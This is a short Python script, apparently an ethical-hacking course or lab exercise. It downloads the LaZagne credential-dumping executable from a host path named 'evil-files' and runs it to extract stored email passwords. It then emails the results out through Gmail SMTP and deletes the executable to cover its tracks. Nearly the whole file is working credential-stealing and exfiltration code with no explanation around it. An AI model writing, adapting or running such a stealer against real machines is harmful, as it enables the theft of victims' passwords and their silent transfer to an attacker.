#!/usr/bin/env python

import requests, subprocess, smtplib, os, tempfile

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_directory = tempfile.gettempdir()
os
download("http://192.168.188.135/evil-files/laZagne_x86.exe")
result = subprocess.check_output("laZagne_x86.exe mails", shell=True)
send_mail("xyz", "xyz", result)
os.remove("laZagne_x86.exe")

